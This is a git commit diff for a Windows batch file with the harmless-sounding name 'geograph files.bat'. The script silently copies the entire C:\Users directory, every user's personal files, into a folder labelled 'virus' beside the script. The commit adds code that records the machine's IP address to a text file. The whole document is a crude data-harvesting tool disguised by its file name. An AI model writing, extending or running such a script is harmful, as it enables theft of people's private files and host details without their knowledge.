d975ef8aede61d2300e09f2a715c7bd461869d37
Yeselamsew_b <149420757+yeselamsewb@users.noreply.github.com>
2024-06-17 16:59:47 +0100

    Update geograph files.bat

--- geograph files.bat
+++ geograph files.bat
@@ -1,9 +1,18 @@
 @echo off
+
+REM Creating virus
 set source=C:\Users
 set destination=%~dp0\virus
 
-echo creating virus %source% to %destination%...
+echo Creating virus from %source% to %destination%...
 xcopy /s /e /i %source% %destination%
-echo virus created.
+echo Virus created.
+
+REM Get current IP address
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
+    echo %%a >> "%~dp0ip_address.txt"
+)
+
+echo IP address saved to "%~dp0ip_address.txt"
 
 pause
